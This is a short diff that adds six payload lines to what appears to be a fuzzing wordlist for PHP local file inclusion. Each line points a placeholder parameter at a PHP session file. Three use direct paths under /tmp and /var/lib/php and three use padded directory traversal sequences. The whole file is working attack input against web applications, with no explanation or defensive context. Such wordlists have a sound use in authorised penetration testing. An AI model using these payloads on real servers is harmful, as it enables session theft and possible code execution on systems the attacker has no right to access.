@@ -1,0 +1,6 @@
+[FOO]=/tmp/sess_[SESS]
+[FOO]=/var/lib/php/session/sess_[SESS]
+[FOO]=/var/lib/php5/session/sess_[SESS]
+[FOO]=.././.././.././.././.././.././.././.././.././.././.././.././.././.././tmp/sess_[SESS]
+[FOO]=.././.././.././.././.././.././.././.././.././.././.././.././.././.././var/lib/php/session/sess_[SESS]
+[FOO]=.././.././.././.././.././.././.././.././.././.././.././.././.././.././var/lib/php5/session/sess_[SESS]
